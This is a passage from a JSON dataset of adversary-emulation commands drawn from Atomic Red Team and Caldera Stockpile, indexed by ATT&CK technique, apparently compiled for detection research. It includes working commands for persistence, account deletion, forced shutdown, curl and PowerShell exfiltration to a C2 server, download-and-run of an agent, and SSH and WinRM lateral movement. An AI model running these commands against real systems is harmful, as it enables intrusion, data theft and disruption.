/private/var/db/emondClients/T1519\n", "name": null}], "command_list": ["sudo cp \"PathToAtomicsFolder/T1519/src/T1519_emond.plist\" /etc/emond.d/rules/T1519_emond.plist\nsudo touch /private/var/db/emondClients/T1519\n"], "technique_id": "T1519", "parsed_datasets": [{"Atomic Red Team Test - Emond": {"display_name": "Emond", "atomic_tests": [{"description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n", "supported_platforms": ["macos"], "name": "Persistance with Event Monitor - emond", "input_arguments": {"plist": {"default": "PathToAtomicsFolder/T1519/src/T1519_emond.plist", "type": "path", "description": "Path to attacker emond plist file"}}, "executor": {"elevation_required": true, "command": "sudo cp \"#{plist}\" /etc/emond.d/rules/T1519_emond.plist\nsudo touch /private/var/db/emondClients/T1519\n", "name": "sh", "cleanup_command": "sudo rm /etc/emond.d/rules/T1519_emond.plist\nsudo rm /private/var/db/emondClients/T1519\n"}}], "attack_technique": "T1519"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1529/T1529.yaml", "command": "shutdown -r now\n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "shutdown -h now\n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "reboot\n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "halt -p      \n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "halt --reboot      \n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "poweroff      \n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "poweroff --reboot  ", "name": null}], "command_list": ["shutdown -r now\n", "shutdown -h now\n", "reboot\n", "halt -p      \n", "halt --reboot      \n", "poweroff      \n", "poweroff --reboot  "], "technique_id": "T1529", "parsed_datasets": [{"Atomic Red Team Test - System Shutdown/Reboot": {"display_name": "System Shutdown/Reboot", "atomic_tests": [{"description": "This test shuts down a Windows system.\n", "supported_platforms": ["windows"], "name": "Shutdown System - Windows", "input_arguments": {"timeout": {"default": 1, "type": "string", "description": "Timeout period before shutdown (seconds)"}}, "executor": {"elevation_required": true, "command": "shutdown /s /t #{timeout}\n", "name": "command_prompt"}}, {"description": "This test restarts a Windows system.\n", "supported_platforms": ["windows"], "name": "Restart System - Windows", "input_arguments": {"timeout": {"default": 1, "type": "string", "description": "Timeout period before restart (seconds)"}}, "executor": {"elevation_required": true, "command": "shutdown /r /t #{timeout}\n", "name": "command_prompt"}}, {"description": "This test restarts a macOS/Linux system.\n", "supported_platforms": ["macos", "linux"], "name": "Restart System via `shutdown` - macOS/Linux", "input_arguments": {"timeout": {"default": "now", "type": "string", "description": "Time to restart (can be minutes or specific time)"}}, "executor": {"elevation_required": true, "command": "shutdown -r #{timeout}\n", "name": "bash"}}, {"description": "This test shuts down a macOS/Linux system using a halt.\n", "supported_platforms": ["macos", "linux"], "name": "Shutdown System via `shutdown` - macOS/Linux", "input_arguments": {"timeout": {"default": "now", "type": "string", "description": "Time to shutdown (can be minutes or specific time)"}}, "executor": {"elevation_required": true, "command": "shutdown -h #{timeout}\n", "name": "bash"}}, {"description": "This test restarts a macOS/Linux system via `reboot`.\n", "supported_platforms": ["macos", "linux"], "name": "Restart System via `reboot` - macOS/Linux", "executor": {"elevation_required": true, "command": "reboot\n", "name": "bash"}}, {"description": "This test shuts down a Linux system using `halt`.\n", "supported_platforms": ["linux"], "name": "Shutdown System via `halt` - Linux", "executor": {"elevation_required": true, "command": "halt -p      \n", "name": "bash"}}, {"description": "This test restarts a Linux system using `halt`.\n", "supported_platforms": ["linux"], "name": "Reboot System via `halt` - Linux", "executor": {"elevation_required": true, "command": "halt --reboot      \n", "name": "bash"}}, {"description": "This test shuts down a Linux system using `poweroff`.\n", "supported_platforms": ["linux"], "name": "Shutdown System via `poweroff` - Linux", "executor": {"elevation_required": true, "command": "poweroff      \n", "name": "bash"}}, {"description": "This test restarts a Linux system using `poweroff`.\n", "supported_platforms": ["linux"], "name": "Reboot System via `poweroff` - Linux", "executor": {"elevation_required": true, "command": "poweroff --reboot  ", "name": "bash"}}], "attack_technique": "T1529"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1531/T1531.yaml", "command": "net.exe user #{user_account} #{new_password}\n", "name": null}, {"source": "atomics/T1531/T1531.yaml", "command": "net.exe user #{user_account} HuHuHUHoHo283283@dJD\n", "name": null}, {"source": "atomics/T1531/T1531.yaml", "command": "net.exe user AtomicAdministrator #{new_password}\n", "name": null}, {"source": "atomics/T1531/T1531.yaml", "command": "net.exe user #{user_account} /delete", "name": null}, {"source": "atomics/T1531/T1531.yaml", "command": "net.exe user AtomicUser /delete", "name": null}], "command_list": ["net.exe user #{user_account} #{new_password}\n", "net.exe user #{user_account} HuHuHUHoHo283283@dJD\n", "net.exe user AtomicAdministrator #{new_password}\n", "net.exe user #{user_account} /delete", "net.exe user AtomicUser /delete"], "technique_id": "T1531", "parsed_datasets": [{"Atomic Red Team Test - Account Access Removal": {"display_name": "Account Access Removal", "atomic_tests": [{"dependencies": [{"description": "User account to change password of must exist (User: #{user_account})\n", "get_prereq_command": "net user #{user_account} #{new_user_password} /add\n", "prereq_command": "net user #{user_account}\n"}], "supported_platforms": ["windows"], "name": "Change User Password - Windows", "executor": {"elevation_required": true, "command": "net.exe user #{user_account} #{new_password}\n", "name": "command_prompt", "cleanup_command": "net.exe user #{user_account} /delete\n"}, "input_arguments": {"new_user_password": {"default": "User2ChangePW!", "type": "string", "description": "Password to use if user account must be created first"}, "new_password": {"default": "HuHuHUHoHo283283@dJD", "type": "string", "description": "New password for the specified account."}, "user_account": {"default": "AtomicAdministrator", "type": "string", "description": "User account whose password will be changed."}}, "description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga.\n"}, {"dependencies": [{"description": "User account to delete must exist (User: #{user_account})\n", "get_prereq_command": "net user #{user_account} #{new_user_password} /add\n", "prereq_command": "net user #{user_account}\n"}], "supported_platforms": ["windows"], "name": "Delete User - Windows", "executor": {"elevation_required": true, "command": "net.exe user #{user_account} /delete", "name": "command_prompt"}, "input_arguments": {"new_user_password": {"default": "User2DeletePW!", "type": "string", "description": "Password to use if user account must be created first"}, "user_account": {"default": "AtomicUser", "type": "string", "description": "User account to be deleted."}}, "description": "Deletes a user account to prevent access.\n"}], "attack_technique": "T1531"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/defense-evasion/36eecb80-ede3-442b-8774-956e906aff02.yml", "command": {"windows": {"psh": {"command": "sleep 60"}}, "darwin": {"sh": {"command": "sleep 60"}}, "linux": {"sh": {"command": "sleep 60"}}}, "name": "Pause all operations to avoid making noise"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/skeleton_key", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/skeleton_key", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/deaduser", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/deaduser", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/eventlog", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/eventlog", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/resolver", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/resolver", "name": "Empire Module Command"}], "command_list": [{"windows": {"psh": {"command": "sleep 60"}}, "darwin": {"sh": {"command": "sleep 60"}}, "linux": {"sh": {"command": "sleep 60"}}}, "powershell/persistence/misc/skeleton_key", "powershell/persistence/misc/skeleton_key", "powershell/persistence/powerbreach/deaduser", "powershell/persistence/powerbreach/deaduser", "powershell/persistence/powerbreach/eventlog", "powershell/persistence/powerbreach/eventlog", "powershell/persistence/powerbreach/resolver", "powershell/persistence/powerbreach/resolver"], "technique_id": "T1108", "parsed_datasets": [{"Mitre Stockpile - Pause all operations to avoid making noise": {"platforms": {"windows": {"psh": {"command": "sleep 60"}}, "darwin": {"sh": {"command": "sleep 60"}}, "linux": {"sh": {"command": "sleep 60"}}}, "description": "Pause all operations to avoid making noise", "tactic": "defense-evasion", "technique": {"attack_id": "T1108", "name": "Redundant Access"}, "id": "36eecb80-ede3-442b-8774-956e906aff02", "name": "1-min sleep"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1108", "Empire Module": "powershell/persistence/misc/skeleton_key", "Technique": "Redundant Access", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/skeleton_key\":  [\"T1108\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1108", "Empire Module": "powershell/persistence/powerbreach/deaduser", "Technique": "Redundant Access", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/powerbreach/deaduser\":  [\"T1108\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1108", "Empire Module": "powershell/persistence/powerbreach/eventlog", "Technique": "Redundant Access", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/powerbreach/eventlog\":  [\"T1108\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1108", "Empire Module": "powershell/persistence/powerbreach/resolver", "Technique": "Redundant Access", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/powerbreach/resolver\":  [\"T1108\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/discovery/5dc841fd-28ad-40e2-b10e-fb007fe09e81.yml", "command": {"windows": {"psh": {"command": "get-wmiobject win32_computersystem | fl model\n"}}}, "name": "Determine if the system is virtualized or physical"}], "command_list": [{"windows": {"psh": {"command": "get-wmiobject win32_computersystem | fl model\n"}}}], "technique_id": "T1497", "parsed_datasets": [{"Mitre Stockpile - Determine if the system is virtualized or physical": {"platforms": {"windows": {"psh": {"command": "get-wmiobject win32_computersystem | fl model\n"}}}, "description": "Determine if the system is virtualized or physical", "tactic": "discovery", "technique": {"attack_id": "T1497", "name": "Virtualization Sandbox Evasion"}, "id": "5dc841fd-28ad-40e2-b10e-fb007fe09e81", "name": "Virtual or Real"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/discovery/9b007f62-daa1-44bd-a57d-00c5315ec6fe.yml", "command": {"darwin": {"sh": {"command": "system_profiler SPUSBDataType\n"}}}, "name": "find attached usb devices"}], "command_list": [{"darwin": {"sh": {"command": "system_profiler SPUSBDataType\n"}}}], "technique_id": "T1120", "parsed_datasets": [{"Mitre Stockpile - find attached usb devices": {"platforms": {"darwin": {"sh": {"command": "system_profiler SPUSBDataType\n"}}}, "description": "find attached usb devices", "tactic": "discovery", "technique": {"attack_id": "T1120", "name": "Peripheral Device Discovery"}, "id": "9b007f62-daa1-44bd-a57d-00c5315ec6fe", "name": "USB Connected Device Discovery"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/execution/60f63260-39bb-4136-87a0-b6c2dca799fc.yml", "command": {"windows": {"psh": {"cleanup": "rm PowerShellCore.msi;\n", "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group} -executors pwsh\" -WindowStyle hidden;\n"}}}, "name": "Download, install and start new process under PowerShell Core 6"}], "command_list": [{"windows": {"psh": {"cleanup": "rm PowerShellCore.msi;\n", "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group} -executors pwsh\" -WindowStyle hidden;\n"}}}], "technique_id": "T1072", "parsed_datasets": [{"Mitre Stockpile - Download, install and start new process under PowerShell Core 6": {"platforms": {"windows": {"psh": {"cleanup": "rm PowerShellCore.msi;\n", "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group} -executors pwsh\" -WindowStyle hidden;\n"}}}, "description": "Download, install and start new process under PowerShell Core 6", "tactic": "execution", "technique": {"attack_id": "T1072", "name": "Third-party Software"}, "id": "60f63260-39bb-4136-87a0-b6c2dca799fc", "name": "Install PowerShell Core 6"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/exfiltration/ea713bc4-63f0-491c-9a6f-0b01d560b87e.yml", "command": {"windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = '#{host.dir.compress}';\n$filePath = '#{host.dir.compress}';\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}, "darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}}, "name": "Exfil the staged directory"}], "command_list": [{"windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = '#{host.dir.compress}';\n$filePath = '#{host.dir.compress}';\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}, "darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}}], "technique_id": "T1041", "parsed_datasets": [{"Mitre Stockpile - Exfil the staged directory": {"platforms": {"windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = '#{host.dir.compress}';\n$filePath = '#{host.dir.compress}';\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}, "darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.dir.compress"}]}], "description": "Exfil the staged directory", "tactic": "exfiltration", "technique": {"attack_id": "T1041", "name": "Exfiltration Over Command and Control Channel"}, "id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "name": "Exfil staged directory"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/impact/3b007f46-23e7-4a11-9c14-e7085b6a754a.yml", "command": {"darwin": {"osa": {"command": "quit app \"Microsoft Outlook.app\""}}}, "name": "Quit Outlook"}, {"source": "data/abilities/impact/68235976-2404-42a8-9105-68230cfef562.yml", "command": {"windows": {"psh,pwsh": {"command": ".\\Invoke-MemeKatz.ps1\n", "payload": "Invoke-MemeKatz.ps1"}, "cmd": {"command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"\n", "payload": "Invoke-MemeKatz.ps1"}}}, "name": "Downloads random meme and sets as desktop background"}], "command_list": [{"darwin": {"osa": {"command": "quit app \"Microsoft Outlook.app\""}}}, {"windows": {"psh,pwsh": {"command": ".\\Invoke-MemeKatz.ps1\n", "payload": "Invoke-MemeKatz.ps1"}, "cmd": {"command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"\n", "payload": "Invoke-MemeKatz.ps1"}}}], "technique_id": "T1491", "parsed_datasets": [{"Mitre Stockpile - Quit Outlook": {"platforms": {"darwin": {"osa": {"command": "quit app \"Microsoft Outlook.app\""}}}, "description": "Quit Outlook", "tactic": "impact", "technique": {"attack_id": "T1491", "name": "Service Stop"}, "id": "3b007f46-23e7-4a11-9c14-e7085b6a754a", "name": "Quit Outlook"}}, {"Mitre Stockpile - Downloads random meme and sets as desktop background": {"platforms": {"windows": {"psh,pwsh": {"command": ".\\Invoke-MemeKatz.ps1\n", "payload": "Invoke-MemeKatz.ps1"}, "cmd": {"command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"\n", "payload": "Invoke-MemeKatz.ps1"}}}, "description": "Downloads random meme and sets as desktop background", "tactic": "impact", "technique": {"attack_id": "T1491", "name": "Defacement"}, "id": "68235976-2404-42a8-9105-68230cfef562", "name": "Invoke-MemeKatz"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/impact/55f9600a-756f-496b-b27f-682052dc429c.yml", "command": {"windows": {"psh": {"command": "mv mission.go mission.exe;\n.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';\n", "payload": "mission.go"}, "cmd": {"command": "copy mission.go mission.exe &&\nmission.exe -duration 60 -extension .caldera -dir C:\\\n", "payload": "mission.go"}}, "darwin": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'\n", "payload": "mission.go"}}, "linux": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'\n", "payload": "mission.go"}}}, "name": "Hunts for files of a certain extension and inserts a message"}], "command_list": [{"windows": {"psh": {"command": "mv mission.go mission.exe;\n.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';\n", "payload": "mission.go"}, "cmd": {"command": "copy mission.go mission.exe &&\nmission.exe -duration 60 -extension .caldera -dir C:\\\n", "payload": "mission.go"}}, "darwin": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'\n", "payload": "mission.go"}}, "linux": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'\n", "payload": "mission.go"}}}], "technique_id": "T1492", "parsed_datasets": [{"Mitre Stockpile - Hunts for files of a certain extension and inserts a message": {"platforms": {"windows": {"psh": {"command": "mv mission.go mission.exe;\n.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';\n", "payload": "mission.go"}, "cmd": {"command": "copy mission.go mission.exe &&\nmission.exe -duration 60 -extension .caldera -dir C:\\\n", "payload": "mission.go"}}, "darwin": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'\n", "payload": "mission.go"}}, "linux": {"sh": {"command": "./mission.go -duration 60 -extension .caldera -dir '/'\n", "payload": "mission.go"}}}, "description": "Hunts for files of a certain extension and inserts a message", "tactic": "impact", "technique": {"attack_id": "T1492", "name": "Stored Data Manipulation"}, "id": "55f9600a-756f-496b-b27f-682052dc429c", "name": "File Hunter Mission"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/initial-access/0ab383be-b819-41bf-91b9-1bd4404d83bf.yml", "command": {"darwin": {"sh": {"cleanup": "pkill -f ragdoll\n", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n"}}, "linux": {"sh": {"cleanup": "pkill -f ragdoll", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n"}}}, "name": "A Python agent which communicates via the HTML contact"}], "command_list": [{"darwin": {"sh": {"cleanup": "pkill -f ragdoll\n", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n"}}, "linux": {"sh": {"cleanup": "pkill -f ragdoll", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n"}}}], "technique_id": "T1199", "parsed_datasets": [{"Mitre Stockpile - A Python agent which communicates via the HTML contact": {"platforms": {"darwin": {"sh": {"cleanup": "pkill -f ragdoll\n", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n"}}, "linux": {"sh": {"cleanup": "pkill -f ragdoll", "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n"}}}, "description": "A Python agent which communicates via the HTML contact", "tactic": "initial-access", "technique": {"attack_id": "T1199", "name": "Trusted Relationship"}, "id": "0ab383be-b819-41bf-91b9-1bd4404d83bf", "name": "Ragdoll"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/lateral-movement/10a9d979-e342-418a-a9b0-002c483e0fa6.yml", "command": {"darwin": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'\n", "command": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'\n", "payload": "sandcat.go-linux"}}, "linux": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'\n", "command": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'\n", "payload": "sandcat.go"}}}, "name": "Copy 54ndc47 to remote host and start it"}], "command_list": [{"darwin": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'\n", "command": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'\n", "payload": "sandcat.go-linux"}}, "linux": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'\n", "command": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'\n", "payload": "sandcat.go"}}}], "technique_id": "T1184", "parsed_datasets": [{"Mitre Stockpile - Copy 54ndc47 to remote host and start it": {"platforms": {"darwin": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'\n", "command": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'\n", "payload": "sandcat.go-linux"}}, "linux": {"sh": {"cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} '(pkill -f sandcat)'\n", "command": "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go-linux 1>/dev/null 2>/dev/null &'\n", "payload": "sandcat.go"}}}, "description": "Copy 54ndc47 to remote host and start it", "tactic": "lateral-movement", "technique": {"attack_id": "T1184", "name": "SSH Hijacking"}, "id": "10a9d979-e342-418a-a9b0-002c483e0fa6", "name": "Start 54ndc47"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "data/abilities/lateral-movement/41bb2b7a-75af-49fd-bd15-6c827df25921.yml", "command": {"windows": {"psh": {"cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} -executors psh}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payload": "sandcat.go-windows"}}}, "name": "Start Agent using WinRM (WinRM)"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/lateral_movement/multi/ssh_command", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/lateral_movement/multi/ssh_command", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/lateral_movement/multi/ssh_launcher", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/lateral_movement/multi/ssh_launcher", "name": "Empire Module Command"}], "command_list": [{"windows": {"psh": {"cleanup": "$username = 